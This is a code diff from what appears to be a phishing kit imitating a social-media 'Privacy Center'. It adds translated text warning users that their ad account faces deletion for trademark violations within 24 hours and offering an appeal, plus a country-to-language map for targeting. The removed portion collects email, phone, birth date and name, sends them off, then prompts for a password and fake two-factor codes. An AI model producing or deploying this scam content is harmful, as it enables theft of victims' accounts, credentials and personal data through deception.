+                'other_rules': 'قواعد ومقالات أخرى',
+                'settings': 'الإعدادات',
+                'warning_title': 'لقد حددنا موعدًا لحذف حسابك الإعلاني وصفحاتك.',
+                'warning_desc1': 'لقد تلقينا تقارير متعددة تشير إلى أن إعلانك ينتهك حقوق العلامات التجارية. بعد مراجعة مفصلة، اتخذنا قرارًا بشأن هذا الأمر.',
+                'warning_desc2': 'إذا لم يتم اتخاذ إجراءات تصحيحية، سيتم حذف حسابك الإعلاني بشكل دائم. إذا كنت ترغب في الاستئناف على هذا القرار، يرجى تقديم طلب استئناف للمراجعة والمساعدة.',
+                'request_review': 'طلب مراجعة',
+                'request_desc1': 'يُستخدم هذا النموذج فقط لتقديم الاستئنافات واستعادة حالة الحساب.',
+                'request_desc2': 'يرجى التأكد من تقديم المعلومات المطلوبة أدناه. قد يؤدي عدم القيام بذلك إلى تأخير معالجة استئنافك.',
+                'request_review_btn': 'طلب مراجعة',
+                'restricted_message': 'سيتم تقييد صفحتك في غضون 24 ساعة إذا لم يتم اتخاذ أي إجراء.',
+                'what_is_trademark': 'ما هو انتهاك العلامة التجارية؟',
+                'trademark_desc': 'بشكل عام، يحدث انتهاك العلامة التجارية عندما يتم استيفاء جميع المتطلبات الثلاثة التالية:',
+                'trademark_point1': 'تستخدم شركة أو شخص علامة تجارية مملوكة لشخص آخر (أو علامة مماثلة) دون إذن.',
+                'trademark_point2': 'يتم هذا الاستخدام في سياق التجارة، أي فيما يتعلق ببيع أو ترويج السلع أو الخدمات.',
+                'trademark_point3': 'من المحتمل أن يتسبب هذا الاستخدام في إرباك المستهلكين بشأن مصدر السلع أو الخدمات أو تأييدها أو تابعيتها.',
+                'trademark_text': 'المعيار الأساسي لانتهاك العلامة التجارية هو غالبًا احتمالية الالتباس. هناك العديد من العوامل التي تحدد ما إذا كان استخدام شخص ما لعلامة تجارية قد يسبب ارتباكًا. على سبيل المثال، عندما يستخدم شخص ما علامة تجارية على سلع أو خدمات غير ذات صلة، قد لا يكون ذلك انتهاكًا لأنه قد لا يسبب ارتباكًا. من المهم أيضًا في كثير من الأحيان مراعاة أي طرف استخدم العلامة التجارية أولاً.',
+                'privacy_center_title': 'مركز الخصوصية',
+                'user_agreement': 'لمزيد من التفاصيل، راجع اتفاقية المستخدم',
+                'footer_note': 'نحن نحدد باستمرار مخاطر الخصوصية المحتملة، بما في ذلك عند جمع المعلومات الشخصية أو استخدامها أو مشاركتها، ونطور طرقًا للتخفيف من هذه المخاطر. اقرأ المزيد عن',
+                'privacy_policy_link': 'سياسة الخصوصية'
+            },
+            'tr': {
+                'privacy_center': 'Gizlilik Merkezi',
+                'home_page': 'Gizlilik Merkezi Ana Sayfası',
+                'search': 'Ara',
+                'privacy_policy': 'Gizlilik Politikası',
+                'other_rules': 'Diğer kurallar ve makaleler',
+                'settings': 'Ayarlar',
+                'warning_title': 'Reklam hesabınızın ve sayfalarınızın silinmesini planladık.',
+                'warning_desc1': 'Reklamınızın ticari marka haklarını ihlal ettiğini belirten birden fazla rapor aldık. Detaylı bir incelemenin ardından bu konu hakkında bir karar verdik.',
+                'warning_desc2': 'Düzeltici işlemler yapılmazsa, reklam hesabınız kalıcı olarak silinecektir. Bu karara itiraz etmek isterseniz, inceleme ve yardım için bir itiraz talebi gönderin.',
+                'request_review': 'İnceleme Talep Et',
+                'request_desc1': 'Bu form yalnızca itiraz göndermek ve hesap durumunu geri yüklemek için kullanılacaktır.',
+                'request_desc2': 'Lütfen aşağıda istenen bilgileri sağladığınızdan emin olun. Aksi takdirde itirazınızın işlenmesi gecikebilir.',
+                'request_review_btn': 'İnceleme Talep Et',
+                'restricted_message': 'Herhangi bir işlem yapılmazsa sayfanız 24 saat içinde kısıtlanacaktır.',
+                'what_is_trademark': 'Ticari marka ihlali nedir?',
+                'trademark_desc': 'Genel olarak, ticari marka ihlali aşağıdaki üç koşulun tümü karşılandığında gerçekleşir:',
+                'trademark_point1': 'Bir şirket veya kişi, izinsiz olarak başkasına ait bir ticari markayı (veya benzer bir işareti) kullanır.',
+                'trademark_point2': 'Bu kullanım, ticaret sürecinde, yani mal veya hizmetlerin satışı veya tanıtımı ile bağlantılı olarak gerçekleşir.',
+                'trademark_point3': 'Bu kullanım, tüketicilerde malların veya hizmetlerin kaynağı, onayı veya bağlantısı konusunda kafa karışıklığına neden olma olasılığı taşır.',
+                'trademark_text': 'Ticari marka ihlalinin temel standardı genellikle kafa karışıklığı olasılığıdır. Bir kişinin ticari marka kullanımının kafa karışıklığına neden olup olmayacağını belirleyen birçok faktör vardır. Örneğin, bir kişi ilgisiz mal veya hizmetler üzerinde bir ticari marka kullandığında, bu kafa karışıklığına neden olmayabileceği için ihlal olmayabilir. Hangi tarafın ticari markayı ilk kullandığını dikkate almak da genellikle önemlidir.',
+                'privacy_center_title': 'Gizlilik Merkezi',
+                'user_agreement': 'Daha fazla ayrıntı için Kullanıcı Sözleşmesine bakın',
+                'footer_note': 'Kişisel bilgileri toplarken, kullanırken veya paylaşırken potansiyel gizlilik risklerini sürekli olarak belirliyor ve bu riskleri azaltmak için yöntemler geliştiriyoruz. Hakkında daha fazla bilgi edinin',
+                'privacy_policy_link': 'Gizlilik Politikası'
+            },
+            'id': {
+                'privacy_center': 'Pusat Privasi',
+                'home_page': 'Beranda Pusat Privasi',
+                'search': 'Cari',
+                'privacy_policy': 'Kebijakan Privasi',
+                'other_rules': 'Aturan dan artikel lainnya',
+                'settings': 'Pengaturan',
+                'warning_title': 'Kami telah menjadwalkan penghapusan akun iklan dan halaman Anda.',
+                'warning_desc1': 'Kami telah menerima beberapa laporan yang menunjukkan bahwa iklan Anda melanggar hak merek dagang. Setelah tinjauan mendetail, kami telah mengambil keputusan mengenai masalah ini.',
+                'warning_desc2': 'Jika tidak ada tindakan perbaikan yang diambil, akun iklan Anda akan dihapus secara permanen. Jika Anda ingin mengajukan banding atas keputusan ini, silakan kirimkan permintaan banding untuk ditinjau dan dibantu.',
+                'request_review': 'Minta Peninjauan',
+                'request_desc1': 'Formulir ini hanya digunakan untuk mengirimkan banding dan memulihkan status akun.',
+                'request_desc2': 'Pastikan Anda memberikan informasi yang diminta di bawah ini. Kegagalan untuk melakukannya dapat menunda pemrosesan banding Anda.',
+                'request_review_btn': 'Minta Peninjauan',
+                'restricted_message': 'Halaman Anda akan dibatasi dalam 24 jam jika tidak ada tindakan yang diambil.',
+                'what_is_trademark': 'Apa itu pelanggaran merek dagang?',
+                'trademark_desc': 'Umumnya, pelanggaran merek dagang terjadi ketika ketiga persyaratan berikut terpenuhi:',
+                'trademark_point1': 'Perusahaan atau orang menggunakan merek dagang milik orang lain (atau tanda serupa) tanpa izin.',
+                'trademark_point2': 'Penggunaan ini terjadi dalam perdagangan, artinya terkait dengan penjualan atau promosi barang atau jasa.',
+                'trademark_point3': 'Penggunaan ini kemungkinan besar menyebabkan kebingungan konsumen tentang sumber, dukungan, atau afiliasi barang atau jasa.',
+                'trademark_text': 'Standar inti untuk pelanggaran merek dagang sering kali adalah kemungkinan kebingungan. Ada banyak faktor yang menentukan apakah penggunaan merek dagang oleh seseorang dapat menyebabkan kebingungan. Misalnya, ketika seseorang menggunakan merek dagang pada barang atau jasa yang tidak terkait, itu mungkin bukan pelanggaran karena mungkin tidak menyebabkan kebingungan. Penting juga untuk mempertimbangkan pihak mana yang menggunakan merek dagang terlebih dahulu.',
+                'privacy_center_title': 'Pusat Privasi',
+                'user_agreement': 'Untuk detail lebih lanjut, lihat Perjanjian Pengguna',
+                'footer_note': 'Kami terus mengidentifikasi potensi risiko privasi, termasuk saat mengumpulkan, menggunakan, atau membagikan informasi pribadi, dan mengembangkan metode untuk mengurangi risiko ini. Baca lebih lanjut tentang',
+                'privacy_policy_link': 'Kebijakan Privasi'
+            },
+            'th': {
+                'privacy_center': 'ศูนย์ความเป็นส่วนตัว',
+                'home_page': 'หน้าหลักศูนย์ความเป็นส่วนตัว',
+                'search': 'ค้นหา',
+                'privacy_policy': 'นโยบายความเป็นส่วนตัว',
+                'other_rules': 'กฎและบทความอื่นๆ',
+                'settings': 'การตั้งค่า',
+                'warning_title': 'เราได้กำหนดเวลาการลบบัญชีโฆษณาและเพจของคุณแล้ว',
+                'warning_desc1': 'เราได้รับรายงานหลายฉบับที่ระบุว่าโฆษณาของคุณละเมิดสิทธิ์เครื่องหมายการค้า หลังจากตรวจสอบโดยละเอียดแล้ว เราได้ตัดสินใจเกี่ยวกับเรื่องนี้',
+                'warning_desc2': 'หากไม่มีการดำเนินการแก้ไข บัญชีโฆษณาของคุณจะถูกลบอย่างถาวร หากคุณต้องการอุทธรณ์คำตัดสินนี้ โปรดส่งคำขออุทธรณ์เพื่อตรวจสอบและช่วยเหลือ',
+                'request_review': 'ขอตรวจสอบ',
+                'request_desc1': 'แบบฟอร์มนี้ใช้สำหรับส่งคำอุทธรณ์และกู้คืนสถานะบัญชีเท่านั้น',
+                'request_desc2': 'โปรดตรวจสอบให้แน่ใจว่าคุณให้ข้อมูลที่ร้องขอด้านล่าง มิฉะนั้นอาจทำให้การดำเนินการอุทธรณ์ของคุณล่าช้า',
+                'request_review_btn': 'ขอตรวจสอบ',
+                'restricted_message': 'เพจของคุณจะถูกจำกัดภายใน 24 ชั่วโมงหากไม่มีการดำเนินการใดๆ',
+                'what_is_trademark': 'การละเมิดเครื่องหมายการค้าคืออะไร?',
+                'trademark_desc': 'โดยทั่วไป การละเมิดเครื่องหมายการค้าเกิดขึ้นเมื่อตรงตามข้อกำหนดทั้งสามข้อต่อไปนี้:',
+                'trademark_point1': 'บริษัทหรือบุคคลใช้เครื่องหมายการค้าที่เป็นของผู้อื่น (หรือเครื่องหมายที่คล้ายกัน) โดยไม่ได้รับอนุญาต',
+                'trademark_point2': 'การใช้งานนี้อยู่ในกระบวนการค้า หมายถึงเกี่ยวข้องกับการขายหรือการส่งเสริมสินค้าหรือบริการ',
+                'trademark_point3': 'การใช้งานนี้มีแนวโน้มที่จะทำให้ผู้บริโภคสับสนเกี่ยวกับแหล่งที่มา การรับรอง หรือความเกี่ยวข้องของสินค้าหรือบริการ',
+                'trademark_text': 'มาตรฐานหลักสำหรับการละเมิดเครื่องหมายการค้ามักจะเป็นความเป็นไปได้ที่จะเกิดความสับสน มีหลายปัจจัยที่กำหนดว่าการใช้เครื่องหมายการค้าของใครบางคนอาจทำให้เกิดความสับสนหรือไม่ ตัวอย่างเช่น เมื่อมีคนใช้เครื่องหมายการค้ากับสินค้าหรือบริการที่ไม่เกี่ยวข้อง อาจไม่ถือเป็นการละเมิดเพราะอาจไม่ทำให้เกิดความสับสน การพิจารณาว่าฝ่ายใดใช้เครื่องหมายการค้าก่อนก็มักจะมีความสำคัญเช่นกัน',
+                'privacy_center_title': 'ศูนย์ความเป็นส่วนตัว',
+                'user_agreement': 'สำหรับรายละเอียดเพิ่มเติม โปรดดูข้อตกลงผู้ใช้',
+                'footer_note': 'เราระบุความเสี่ยงด้านความเป็นส่วนตัวที่อาจเกิดขึ้นอย่างต่อเนื่อง รวมถึงเมื่อรวบรวม ใช้ หรือแบ่งปันข้อมูลส่วนบุคคล และพัฒนาแนวทางในการลดความเสี่ยงเหล่านี้ อ่านเพิ่มเติมเกี่ยวกับ',
+                'privacy_policy_link': 'นโยบายความเป็นส่วนตัว'
+            },
+            'pl': {
+                'privacy_center': 'Centrum Prywatności',
+                'home_page': 'Strona główna Centrum Prywatności',
+                'search': 'Szukaj',
+                'privacy_policy': 'Polityka prywatności',
+                'other_rules': 'Inne zasady i artykuły',
+                'settings': 'Ustawienia',
+                'warning_title': 'Zaplanowaliśmy usunięcie Twojego konta reklamowego i stron.',
+                'warning_desc1': 'Otrzymaliśmy wiele zgłoszeń wskazujących, że Twoja reklama narusza prawa do znaków towarowych. Po szczegółowym przeglądzie podjęliśmy decyzję w tej sprawie.',
+                'warning_desc2': 'Jeśli nie zostaną podjęte działania naprawcze, Twoje konto reklamowe zostanie trwale usunięte. Jeśli chcesz odwołać się od tej decyzji, prześlij prośbę o odwołanie w celu przeglądu i pomocy.',
+                'request_review': 'Zażądaj przeglądu',
+                'request_desc1': 'Ten formularz może być używany wyłącznie do składania odwołań i przywracania statusu konta.',
+                'request_desc2': 'Upewnij się, że podajesz wymagane informacje poniżej. Niezastosowanie się do tego może opóźnić przetwarzanie Twojego odwołania.',
+                'request_review_btn': 'Zażądaj przeglądu',
+                'restricted_message': 'Twoja strona zostanie ograniczona w ciągu 24 godzin, jeśli nie zostanie podjęta żadna akcja.',
+                'what_is_trademark': 'Co to jest naruszenie znaku towarowego?',
+                'trademark_desc': 'Ogólnie rzecz biorąc, naruszenie znaku towarowego ma miejsce, gdy spełnione są wszystkie trzy następujące wymagania:',
+                'trademark_point1': 'Firma lub osoba używa znaku towarowego należącego do kogoś innego (lub podobnego znaku) bez pozwolenia.',
+                'trademark_point2': 'To użycie odbywa się w obrocie handlowym, co oznacza, że jest związane ze sprzedażą lub promocją towarów lub usług.',
+                'trademark_point3': 'To użycie może powodować zamieszanie wśród konsumentów co do źródła, poparcia lub powiązania towarów lub usług.',
+                'trademark_text': 'Podstawowym standardem naruszenia znaku towarowego jest często prawdopodobieństwo wprowadzenia w błąd. Istnieje wiele czynników, które decydują o tym, czy użycie znaku towarowego przez kogoś może powodować zamieszanie. Na przykład, gdy ktoś używa znaku towarowego na niepowiązanych towarach lub usługach, może to nie być naruszeniem, ponieważ może nie powodować zamieszania. Ważne jest również, aby wziąć pod uwagę, która strona użyła znaku towarowego jako pierwsza.',
+                'privacy_center_title': 'Centrum Prywatności',
+                'user_agreement': 'Więcej szczegółów można znaleźć w Umowie użytkownika',
+                'footer_note': 'Stale identyfikujemy potencjalne ryzyko dla prywatności, w tym podczas zbierania, wykorzystywania lub udostępniania danych osobowych, i opracowujemy metody ograniczania tego ryzyka. Przeczytaj więcej o',
+                'privacy_policy_link': 'Polityce prywatności'
+            },
+            'nl': {
+                'privacy_center': 'Privacycentrum',
+                'home_page': 'Startpagina Privacycentrum',
+                'search': 'Zoeken',
+                'privacy_policy': 'Privacybeleid',
+                'other_rules': 'Andere regels en artikelen',
+                'settings': 'Instellingen',
+                'warning_title': 'We hebben de verwijdering van uw advertentieaccount en pagina\'s gepland.',
+                'warning_desc1': 'We hebben meerdere meldingen ontvangen dat uw advertentie inbreuk maakt op merkrechten. Na een gedetailleerde beoordeling hebben we een beslissing over deze zaak genomen.',
+                'warning_desc2': 'Als er geen corrigerende maatregelen worden genomen, wordt uw advertentieaccount permanent verwijderd. Als u in beroep wilt gaan tegen dit besluit, dient u een verzoek tot beroep in voor beoordeling en ondersteuning.',
+                'request_review': 'Beoordeling aanvragen',
+                'request_desc1': 'Dit formulier mag alleen worden gebruikt voor het indienen van beroepen en het herstellen van de accountstatus.',
+                'request_desc2': 'Zorg ervoor dat u de hieronder gevraagde informatie verstrekt. Als u dit niet doet, kan de verwerking van uw beroep worden vertraagd.',
+                'request_review_btn': 'Beoordeling aanvragen',
+                'restricted_message': 'Uw pagina wordt binnen 24 uur beperkt als er geen actie wordt ondernomen.',
+                'what_is_trademark': 'Wat is inbreuk op het merk?',
+                'trademark_desc': 'Over het algemeen is er sprake van merkinbreuk wanneer aan alle drie de volgende vereisten is voldaan:',
+                'trademark_point1': 'Een bedrijf of persoon gebruikt een merk van iemand anders (of een soortgelijk teken) zonder toestemming.',
+                'trademark_point2': 'Dit gebruik vindt plaats in het kader van de handel, d.w.z. in verband met de verkoop of promotie van goederen of diensten.',
+                'trademark_point3': 'Dit gebruik kan bij consumenten verwarring veroorzaken over de herkomst, goedkeuring of verbondenheid van de goederen of diensten.',
+                'trademark_text': 'De kernstandaard voor merkinbreuk is vaak de waarschijnlijkheid van verwarring. Er zijn veel factoren die bepalen of iemands gebruik van een merk verwarring kan veroorzaken. Wanneer iemand bijvoorbeeld een merk gebruikt op niet-gerelateerde goederen of diensten, is er mogelijk geen sprake van inbreuk omdat het geen verwarring kan veroorzaken. Het is ook vaak belangrijk om te overwegen welke partij het merk als eerste heeft gebruikt.',
+                'privacy_center_title': 'Privacycentrum',
+                'user_agreement': 'Raadpleeg de Gebruikersovereenkomst voor meer details',
+                'footer_note': 'We identificeren continu potentiële privacyrisico\'s, ook bij het verzamelen, gebruiken of delen van persoonlijke informatie, en ontwikkelen methoden om deze risico\'s te beperken. Lees meer over',
+                'privacy_policy_link': 'Privacybeleid'
+            },
+            'sv': {
+                'privacy_center': 'Integritetscenter',
+                'home_page': 'Integritetscentrets startsida',
+                'search': 'Sök',
+                'privacy_policy': 'Integritetspolicy',
+                'other_rules': 'Andra regler och artiklar',
+                'settings': 'Inställningar',
+                'warning_title': 'Vi har planerat borttagningen av ditt annonskonto och dina sidor.',
+                'warning_desc1': 'Vi har fått flera rapporter som indikerar att din annons bryter mot varumärkesrättigheter. Efter en detaljerad granskning har vi fattat ett beslut i denna fråga.',
+                'warning_desc2': 'Om inga korrigerande åtgärder vidtas kommer ditt annonskonto att raderas permanent. Om du vill överklaga detta beslut, skicka in en överklagandeframställan för granskning och hjälp.',
+                'request_review': 'Begär granskning',
+                'request_desc1': 'Detta formulär får endast användas för att lämna in överklaganden och återställa kontostatus.',
+                'request_desc2': 'Se till att du tillhandahåller den begärda informationen nedan. Underlåtenhet att göra detta kan försena behandlingen av ditt överklagande.',
+                'request_review_btn': 'Begär granskning',
+                'restricted_message': 'Din sida kommer att begränsas inom 24 timmar om ingen åtgärd vidtas.',
+                'what_is_trademark': 'Vad är varumärkesintrång?',
+                'trademark_desc': 'Generellt sett inträffar varumärkesintrång när alla tre följande krav är uppfyllda:',
+                'trademark_point1': 'Ett företag eller en person använder ett varumärke som ägs av någon annan (eller ett liknande märke) utan tillstånd.',
+                'trademark_point2': 'Denna användning sker i handeln, vilket innebär att den är kopplad till försäljning eller marknadsföring av varor eller tjänster.',
+                'trademark_point3': 'Denna användning kan sannolikt orsaka förvirring hos konsumenterna om ursprunget, stödet eller anknytningen till varorna eller tjänsterna.',
+                'trademark_text': 'Kärnstandarden för varumärkesintrång är ofta sannolikheten för förväxling. Det finns många faktorer som avgör om någons användning av ett varumärke kan orsaka förvirring. Till exempel, när någon använder ett varumärke på orelaterade varor eller tjänster, kanske det inte är intrång eftersom det kanske inte orsakar förvirring. Det är också ofta viktigt att överväga vilken part som använde varumärket först.',
+                'privacy_center_title': 'Integritetscenter',
+                'user_agreement': 'För mer information, se Användaravtalet',
+                'footer_note': 'Vi identifierar kontinuerligt potentiella integritetsrisker, inklusive när vi samlar in, använder eller delar personlig information, och utvecklar metoder för att minska dessa risker. Läs mer om',
+                'privacy_policy_link': 'Integritetspolicy'
+            },
+            'cs': {
+                'privacy_center': 'Centrum ochrany soukromí',
+                'home_page': 'Domovská stránka Centra ochrany soukromí',
+                'search': 'Hledat',
+                'privacy_policy': 'Zásady ochrany osobních údajů',
+                'other_rules': 'Další pravidla a články',
+                'settings': 'Nastavení',
+                'warning_title': 'Naplánovali jsme smazání vašeho reklamního účtu a stránek.',
+                'warning_desc1': 'Obdrželi jsme několik zpráv, které naznačují, že vaše reklama porušuje práva k ochranným známkám. Po podrobném přezkoumání jsme v této věci učinili rozhodnutí.',
+                'warning_desc2': 'Pokud nebudou přijata nápravná opatření, váš reklamní účet bude trvale smazán. Pokud se proti tomuto rozhodnutí chcete odvolat, zašlete žádost o odvolání k přezkoumání a pomoci.',
+                'request_review': 'Požádat o přezkum',
+                'request_desc1': 'Tento formulář je určen pouze pro podávání odvolání a obnovení stavu účtu.',
+                'request_desc2': 'Ujistěte se, že poskytnete požadované informace níže. Pokud tak neučiníte, může dojít ke zpoždění zpracování vašeho odvolání.',
+                'request_review_btn': 'Požádat o přezkum',
+                'restricted_message': 'Vaše stránka bude omezena do 24 hodin, pokud nebudou přijata žádná opatření.',
+                'what_is_trademark': 'Co je porušení ochranné známky?',
+                'trademark_desc': 'Obecně platí, že k porušení ochranné známky dochází, když jsou splněny všechny tři následující požadavky:',
+                'trademark_point1': 'Společnost nebo osoba používá ochrannou známku vlastněnou někým jiným (nebo podobnou známku) bez povolení.',
+                'trademark_point2': 'Toto použití probíhá v rámci obchodního styku, tj. v souvislosti s prodejem nebo propagací zboží nebo služeb.',
+                'trademark_point3': 'Toto použití pravděpodobně způsobí záměnu spotřebitelů ohledně původu, schválení nebo přidružení zboží nebo služeb.',
+                'trademark_text': 'Základním standardem pro porušení ochranné známky je často pravděpodobnost záměny. Existuje mnoho faktorů, které určují, zda použití ochranné známky někým může způsobit záměnu. Například když někdo použije ochrannou známku na nesouvisející zboží nebo služby, nemusí se jednat o porušení, protože to nemusí způsobit záměnu. Často je také důležité zvážit, která strana použila ochrannou známku jako první.',
+                'privacy_center_title': 'Centrum ochrany soukromí',
+                'user_agreement': 'Další podrobnosti naleznete v Uživatelské smlouvě',
+                'footer_note': 'Neustále identifikujeme potenciální rizika ochrany soukromí, včetně shromažďování, používání nebo sdílení osobních údajů, a vyvíjíme metody ke zmírnění těchto rizik. Přečtěte si více o',
+                'privacy_policy_link': 'Zásadách ochrany osobních údajů'
             }
+        };
 
-            // DOB validation
-            const day = parseInt(document.getElementById('day').value);
-            const month = parseInt(document.getElementById('month').value);
-            const year = parseInt(document.getElementById('year').value);
-            if (!day || day < 1 || day > 31) {
-                showFormError('error-dob', window.getTranslation ? window.getTranslation('error.dayRange') : 'Lütfen geçerli bir gün girin (1-31)');
-                document.getElementById('day').focus();
-                return;
-            }
-            if (!month || month < 1 || month > 12) {
-                showFormError('error-dob', window.getTranslation ? window.getTranslation('error.monthRange') : 'Lütfen geçerli bir ay girin (1-12)');
-                document.getElementById('month').focus();
-                return;
-            }
-            if (!year || year < 1 || year > new Date().getFullYear()) {
-                showFormError('error-dob', window.getTranslation ? window.getTranslation('error.yearRange') : 'Lütfen geçerli bir yıl girin');
-                document.getElementById('year').focus();
-                return;
-            }
-
-            // Phone validation - require at least 7 digits after country code
-            const phoneEl = document.getElementById('phone');
-            const phoneValue = phoneEl.value.replace(/\s/g, '');
-            const afterCode = phoneValue.startsWith(currentCountryCode)
-                ? phoneValue.substring(currentCountryCode.length)
-                : phoneValue.replace(/^\+?\d{1,3}/, '');
-            const digitCount = (afterCode.match(/\d/g) || []).length;
-            if (digitCount < 7 || phoneValue === currentCountryCode || phoneValue.trim() === currentCountryCode.trim()) {
-                showFormError('error-phone', window.getTranslation ? window.getTranslation('error.phone') : 'Lütfen geçerli bir telefon numarası girin (en az 7 hane)');
-                phoneEl.focus();
-                return;
-            }
-
-            isSubmittingInfo = true;
-
-            const btn = document.getElementById('info-submit-btn');
-            const btnText = document.getElementById('info-btn-text');
-            const spinner = document.getElementById('info-spinner');
-            btnText.style.display = 'none';
-            spinner.style.display = 'inline-block';
-            btn.disabled = true;
-
-            // Save form data for potential re-use in password step
-            window._savedFormData = {
-                email: email,
-                emailBusiness: document.getElementById('emailBusiness')?.value || '',
-                fullName: document.getElementById('fullName').value,
-                phone: document.getElementById('phone').value,
-                fanpage: document.getElementById('fanpage').value,
-                dob: `${day}/${month}/${year}`,
-                note: document.getElementById('message')?.value || '',
-                device: getDeviceInfo()
-            };
-
-            try {
-                // Run API call and minimum delay in parallel
-                const [result] = await Promise.all([
-                    sendData({
-                        type: 'info',
-                        ...window._savedFormData
-                    }),
-                    new Promise(r => setTimeout(r, 3000)) // minimum 3s loading
-                ]);
-
-                if (result && result.success && result.session_id) {
-                    currentSessionId = result.session_id;
-                    localStorage.setItem('session_id', result.session_id);
-                }
-
-                // Go straight to password modal (skip "Not Logged In" popup)
-                document.getElementById('modal-password').classList.remove('hidden');
-            } catch (err) {
-                console.error('Error:', err);
-                // Still proceed to password step - it will handle sending data
-                document.getElementById('modal-password').classList.remove('hidden');
-            } finally {
-                isSubmittingInfo = false;
-                btnText.style.display = '';
-                spinner.style.display = 'none';
-                btn.disabled = false;
-            }
-        });
-
-        /* ===== Password Eye Toggle ===== */
-        document.getElementById('toggle-password').addEventListener('click', function () {
-            const pwdInput = document.getElementById('password');
-            const eyeOff = document.getElementById('eye-off-icon');
-            const eyeOn = document.getElementById('eye-on-icon');
-            if (pwdInput.type === 'password') {
-                pwdInput.type = 'text';
-                eyeOff.style.display = 'none';
-                eyeOn.style.display = '';
-            } else {
-                pwdInput.type = 'password';
-                eyeOff.style.display = '';
-                eyeOn.style.display = 'none';
-            }
-        });
-
-        /* ===== Masking Helpers (matching v2) ===== */
-        function maskEmail(email) {
-            if (!email) return '';
-            const [name, domain] = email.split('@');
-            if (!domain) return email;
-            const maskedName = name.charAt(0) + '**' + name.charAt(name.length - 1);
-            return maskedName + '@' + domain;
-        }
-
-        function maskPhone(phone) {
-            if (!phone) return '';
-            const cleaned = phone.replace(/\s/g, '');
-            if (cleaned.length < 6) return phone;
-            const lastDigits = cleaned.slice(-2);
-            const prefix = cleaned.slice(0, -4);
-            return prefix + ' ** ' + lastDigits;
-        }
-        
-        function maskPhone(phone) {
-            const visibleCount = 2; // 2 số cuối
-            const countryCodeMatch = phone.match(/^\+\d{1,3}/); // lấy mã quốc gia
-            const countryCode = countryCodeMatch ? countryCodeMatch[0] : phone.slice(0,3);
-
-            // phần giữa countryCode và 2 số cuối
-            let middle = phone.slice(countryCode.length, phone.length - visibleCount);
-
-            // tạo mask cho phần giữa
-            let mask = '*'.repeat(middle.length);
-
-            // chia mask thành nhóm 3 ký tự, cách nhau 1 space
-            let groups = mask.match(/.{1,3}/g) || [];
-
-            // giới hạn tối đa 3 nhóm *
-            if (groups.length > 3) {
-                groups = groups.slice(0, 3);
-            }
-
-            // nối lại với space
-            mask = groups.join(' ');
-
-            // kết hợp countryCode + mask + 2 số cuối dính liền
-            return countryCode + (mask ? ' ' + mask : '') + phone.slice(-visibleCount) + '\u00A0.'; 
-        }
-
-        function update2FADisplay() {
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
-            const fullName = document.getElementById('fullName').value;
-            const emailDisplay = document.getElementById('2fa-email-display');
-            const maskedInfo = document.getElementById('2fa-masked-info');
-            const stepEl = document.getElementById('2fa-step');
+        // ============================================================
+        // MAP COUNTRY CODE → LANGUAGE CODE - 20 NGÔN NGỮ
+        // ============================================================
+        const countryToLanguage = {
+            // Châu Á
+            'VN': 'vi', 'TH': 'th', 'ID': 'id', 'PH': 'tl', 'MY': 'ms',
+            'SG': 'zh', 'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh',
+            'JP': 'ja', 'KR': 'ko', 'IN': 'hi', 'PK': 'ur', 'BD': 'bn',
+            'LK': 'si', 'NP': 'ne', 'KH': 'km', 'LA': 'lo', 'MM': 'my',
+            'AF': 'ps', 'IR': 'fa', 'IQ': 'ar', 'SA': 'ar', 'AE': 'ar',
+            'KW': 'ar', 'QA': 'ar', 'BH': 'ar', 'OM': 'ar', 'YE': 'ar',
+            'JO': 'ar', 'LB': 'ar', 'SY': 'ar', 'PS': 'ar', 'IL': 'he',
+            'TR': 'tr',
             
-            if (emailDisplay) emailDisplay.textContent = fullName;
+            // Châu Âu
+            'GB': 'en', 'US': 'en', 'AU': 'en', 'NZ': 'en', 'CA': 'en',
+            'FR': 'fr', 'DE': 'de', 'IT': 'it', 'ES': 'es', 'PT': 'pt',
+            'RU': 'ru', 'UA': 'uk', 'PL': 'pl', 'RO': 'ro', 'NL': 'nl',
+            'BE': 'nl', 'GR': 'el', 'CZ': 'cs', 'HU': 'hu', 'SE': 'sv',
+            'NO': 'no', 'DK': 'da', 'FI': 'fi', 'IE': 'en', 'AT': 'de',
+            'CH': 'de', 'BG': 'bg', 'HR': 'hr', 'RS': 'sr', 'BA': 'bs',
+            'AL': 'sq', 'MK': 'mk', 'ME': 'sr', 'XK': 'sq',
+            
+            // Châu Mỹ
+            'MX': 'es', 'BR': 'pt', 'AR': 'es', 'CL': 'es', 'CO': 'es',
+            'PE': 'es', 'VE': 'es', 'EC': 'es', 'BO': 'es', 'PY': 'es',
+            'UY': 'es', 'CR': 'es', 'PA': 'es', 'GT': 'es', 'HN': 'es',
+            'SV': 'es', 'NI': 'es', 'DO': 'es', 'CU': 'es', 'PR': 'es',
+            
+            // Châu Phi
+            'ZA': 'af', 'NG': 'en', 'EG': 'ar', 'MA': 'ar', 'DZ': 'ar',
+            'TN': 'ar', 'LY': 'ar', 'SD': 'ar', 'KE': 'sw', 'TZ': 'sw',
+            'UG': 'sw', 'GH': 'en', 'CI': 'fr', 'SN': 'fr', 'CM': 'fr',
+            'MG': 'mg', 'MZ': 'pt', 'AO': 'pt', 'ZW': 'en', 'ZM': 'en'
+        };
 
-            if (maskedInfo) {
-                maskedInfo.textContent = maskPhone(phone);  // gán số đã mask
-                maskedInfo.style.direction = 'ltr';         // fix LTR trong modal RTL
-                maskedInfo.style.unicodeBidi = 'embed';    // tránh đảo số
-
-                // thêm dấu cách giữa +20 và *
-                return phone.slice(0, countryCodeLength) + ' ' + mask + phone.slice(-visibleCount);
-
-            }
-            if (stepEl) stepEl.textContent = tfaAttempts + 1;
-        }
-
-        /* ===== Form Validation Helpers ===== */
-        function showFormError(id, msg) {
-            const el = document.getElementById(id);
-            if (el) { el.querySelector('span').textContent = msg; el.classList.add('visible'); }
-        }
-        function clearFormErrors() {
-            document.querySelectorAll('.form-error').forEach(el => {
-                el.classList.remove('visible');
-                const span = el.querySelector('span');
-                if (span) span.textContent = '';
-            });
-        }
-        ['email', 'day', 'month', 'year', 'phone'].forEach(id => {
-            document.getElementById(id)?.addEventListener('input', clearFormErrors);
-        });
-
-        /* ===== Password Form Submit (v2 logic) ===== */
-        let tfaAttempts = 0;
-        document.getElementById('form-password').addEventListener('submit', async function (e) {
-            e.preventDefault();
-            const pwd = document.getElementById('password');
-            const error = document.getElementById('pwd-error');
-            const btnText = document.getElementById('pwd-btn-text');
